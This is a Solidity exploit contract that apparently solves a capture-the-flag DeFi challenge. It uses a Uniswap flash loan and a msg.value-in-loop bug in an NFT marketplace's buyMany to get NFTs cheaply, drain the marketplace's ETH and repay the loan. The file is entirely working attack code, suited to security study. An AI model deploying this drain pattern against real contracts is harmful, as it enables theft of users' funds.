// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// WETH9 uses another solc version
interface WETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract Attack is IERC721Receiver {   // is IUniswapV2Callee - would need to import solc 0.6 version, I'm too lazy for that

    FreeRiderNFTMarketplace market;
    WETH weth;
    address buyer;
    IERC721 nft;

    constructor (address payable marketAddress, address wethAddress, address buyerAddress, address nftAddress) public payable {
        market = FreeRiderNFTMarketplace(marketAddress);
        weth = WETH(wethAddress);
        buyer = buyerAddress;
        nft = IERC721(nftAddress);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external // overwrite
    {
        // should do some more safety checks first

        uint ethAmount = amount0 > 0 ? amount0 : amount1;
        require(ethAmount == 30 ether, "Wrong ether amount");

        // convert WETH to ETH (the nft marketplace wants ETH)
        weth.withdraw(30 ether);

        // Buy some NFTs. The function uses msg.value in a loop, which is a critical error which we'll exploit.
        // We just pay 15 ETH for however many NFTs we want to, but the contract pays each owner the 15 ETH.
        // 15 ETH is still way too much for us, we won't be able to repay our loan - need to iterate this process ourselves.
        // We need to make sure the marketplace still has enough ETH left for us, so we can't buy all 6 NFTs just yet.
        uint[] memory ids = new uint[](2);
        for (uint8 i = 0; i < 2; i++)
        {
            ids[i] = i;
        }
        market.buyMany{value: 15 ether}(ids);
        // we have 2 NFTs now for a discounted price of just 15 ether (instead of 30).
        // let's list them ourselves.
        uint[] memory prices = new uint[](2);
        for (uint8 i = 0; i < 2; i++)
        {
            prices[i] = 15 ether;
            nft.approve(address(market), i);
        }
        market.offerMany(ids, prices);
        // now buy them back ourselves - the marketplace is kind enough to send us 30 ETH back.
        // so we got our money back.
        uint[] memory ids2 = new uint[](6);
        for (uint8 i = 0; i < 6; i++)
        {
            ids2[i] = i;
        }
        // btw, it's great how the ERC721 standard allows safeTransferFrom with identical from and to
        market.buyMany{value: 15 ether}(ids2);

        // we need to pay for the loan with our own money, hence we transferred a little bit of ETH on construction
        weth.deposit{value: address(this).balance}();
        weth.transfer(msg.sender, ethAmount * 1000 / 996);
        for (uint8 i = 0; i < 6; i++)
        {
            nft.safeTransferFrom(address(this), buyer, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    override
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}